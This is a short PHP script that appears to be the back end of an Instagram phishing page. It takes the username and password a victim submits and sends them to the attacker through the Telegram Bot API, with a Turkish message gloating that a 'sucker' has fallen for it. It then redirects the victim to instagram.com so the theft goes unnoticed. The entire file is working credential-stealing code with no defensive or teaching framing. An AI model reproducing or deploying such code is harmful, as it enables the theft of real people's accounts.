<?php
include('tg.php');
 $user = $_POST["username"];
 $pass = $_POST["password"];

 $us = "Username: $user\n";
 $pa = "Password: $pass\n";


$data = [
  'text' => '➡️ Lan Koş Sazan Düştü 😈 
Kullanıcı Adı : '.$us.'
Şifre : '.$pass.'
',
  'chat_id' => $chat_id
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
 header('Location: https://instagram.com/');
 exit()

